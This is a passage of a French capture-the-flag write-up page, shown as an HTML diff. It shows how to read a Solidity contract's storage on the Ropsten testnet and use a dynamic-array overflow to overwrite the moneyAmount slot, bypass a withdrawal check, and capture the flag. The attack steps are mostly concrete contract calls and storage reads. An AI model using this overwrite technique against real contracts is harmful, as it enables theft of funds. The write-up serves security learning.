+<span class="nx">contract</span><span class="p">.</span><span class="nx">putMoneyOnAccount</span><span class="p">(</span><span class="s2">"0x123"</span><span class="p">,</span> <span class="s2">"0x16"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+
+<span class="c1">// on retrouve ce que l'on a ajouté</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">getMoneyFromAccount</span><span class="p">(</span><span class="s2">"0x123"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">22</span>
+</code></pre></div></div>
+
+<p>La taille en slot 1 a-t-elle changé ?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
+1: 0x0000000000000000000000000000000000000000000000000000000000000124
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nx">savingAccounts</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;=</span> <span class="nx">accountNumber</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">savingAccounts</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="nx">accountNumber</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Ce code a donc bien été exécutée, la taille vaut bien <code class="highlighter-rouge">0x124</code>.</p>
+
+<p>D’après les ressources précédentes, on peut retrouver le numéro de slot ou est stocké notre <code class="highlighter-rouge">0x16</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keccak256<span class="o">(</span>abi.encodePacked<span class="o">(</span>uint256<span class="o">(</span>1<span class="o">)))</span> + 0x123
+</code></pre></div></div>
+
+<ul>
+  <li><code class="highlighter-rouge">keccak256(abi.encodePacked(uint256(1)))</code>: adresse du premier élément du tableau (<code class="highlighter-rouge">savingAccounts[0]</code>)</li>
+  <li><code class="highlighter-rouge">0x123</code>: décalage par rapport à la première case du tableau</li>
+</ul>
+
+<p>On trouve alors <code class="highlighter-rouge">80084422859880547211683076133703299733277748156566366325829078699459944779289</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">myth</span> <span class="nx">read</span><span class="o">-</span><span class="nx">storage</span> <span class="o">--</span><span class="nx">rpc</span> <span class="nx">infura</span><span class="o">-</span><span class="nx">ropsten</span> <span class="mi">80084422859880547211683076133703299733277748156566366325829078699459944779289</span> <span class="mh">0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5</span>
+
+<span class="mi">80084422859880547211683076133703299733277748156566366325829078699459944779289</span><span class="p">:</span> <span class="mh">0x0000000000000000000000000000000000000000000000000000000000000016</span>
+</code></pre></div></div>
+
+<p>On retrouve bien le <code class="highlighter-rouge">0x16</code> que nous avons envoyé tout à l’heure.</p>
+
+<h2 id="attack-4">Attack</h2>
+
+<blockquote>
+  <ul>
+    <li><a href="https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow">Array overflow</a></li>
+    <li><a href="https://medium.com/@iphelix/chain-heist-writeup-4f008cd6d346">Vehicle Registration System</a></li>
+  </ul>
+</blockquote>
+
+<p>Notre but va être de localiser la position du slot 0, étant donné que c’est ce dernier qui contient la valeur de <code class="highlighter-rouge">moneyAmount</code>, qui je le rappelle vaut 0 pour le moment. Pour cela, nous allons faire un array overflow.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">moneyAmount</span> <span class="o">&gt;=</span> <span class="mi">2000000</span> 
+</code></pre></div></div>
+
+<p>Le but de cette modification est de bypass le require de la fonction <code class="highlighter-rouge">withdrawMoneyFromAccount()</code>.</p>
+
+<p>D’après les ressources, on peut avoir accès en écriture au slot 0 à <code class="highlighter-rouge">savingAccounts[2**256 - keccak256(abi.encodePacked(uint256(1)))]</code>.</p>
+
+<p>On trouve alors <code class="highlighter-rouge">4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</code>.</p>
+
+<p>Essayons alors d’écrire <code class="highlighter-rouge">0x456</code> à cet index.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># valeur de moneyAmount</span>
+<span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
+0: 0x0000000000000000000000000000000000000000000000000000000000000000
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">putMoneyOnAccount</span><span class="p">(</span><span class="s2">"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"</span><span class="p">,</span> <span class="s2">"0x456"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># valeur de moneyAmount</span>
+<span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
+0: 0x0000000000000000000000000000000000000000000000000000000000000456
+</code></pre></div></div>
+
+<blockquote>
+  <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">moneyAmount</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">1110</span>
+</code></pre></div>  </div>
+
+  <p>On peut aussi faire l’appel directement dans la console Javascript étant donné que <code class="highlighter-rouge">moneyAmount</code>est un champ public.</p>
+</blockquote>
+
+<p>La valeur de <code class="highlighter-rouge">moneyAmount</code>est bien passée de <code class="highlighter-rouge">0</code> à <code class="highlighter-rouge">0x456</code>. Modifions encore cette valeur pour passer le require.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">putMoneyOnAccount</span><span class="p">(</span><span class="s2">"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"</span><span class="p">,</span> <span class="s2">"0xffffffff"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>myth read-storage <span class="nt">--rpc</span> infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
+0: 0x00000000000000000000000000000000000000000000000000000000ffffffff
+</code></pre></div></div>
+
+<p>Enfin pour respecter la seconde condition du require, nous devons appeler le fonction <code class="highlighter-rouge">withdrawMoneyFromAccount</code> avec en paramètre un numéro de compte qui respecte cette condition: <code class="highlighter-rouge">savingAccounts[accountNumber] &gt;= 1</code>, on peut réutiliser l’adresse du slot 0, cela a peu d’importance.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">withdrawMoneyFromAccount</span><span class="p">(</span><span class="s2">"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+</code></pre></div></div>
+
+<p>On peut alors récupérer le flag.</p>
+
+<p><code class="highlighter-rouge">SANTA{Y0u_Fin4lLy_DiD_i7!!!}</code></p>
+
+<h1 id="remarques-1">Remarques</h1>
+
+<p>Il est aussi possible d’utiliser directement l’IDE <a href="https://remix.ethereum.org/">Remix</a> pour résoudre les challenges, ce dernier étant plus user-friendly. J’ai préféré débuter directement dans la console, pour mieux comprendre les mécanismes.</p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/2019/12/05/sigsegv2/">
+            sigsegv2
+            <small>05 Dec 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2019/07/29/linux/">
+            linux
+            <small>29 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2019/07/28/crypto/">
+            crypto
+            <small>28 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
